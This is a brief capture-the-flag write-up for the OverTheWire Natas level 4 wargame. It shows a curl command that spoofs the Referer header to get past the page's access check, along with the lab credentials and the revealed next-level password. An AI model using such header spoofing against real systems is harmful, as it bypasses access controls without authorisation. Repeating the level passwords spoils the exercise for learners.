# Over The Wire -- Natas 4

## Server URL
```
http://natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ@natas4.natas.labs.overthewire.org
```

## Solution
The website says that we need to come from `http://natas5.natas.labs.overthewire.org/`

So we use curl to spoof the referer header 
```
curl --referer http://natas5.natas.labs.overthewire.org/ http://natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ@natas4.natas.labs.overthewire.org
```

We get
```
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```
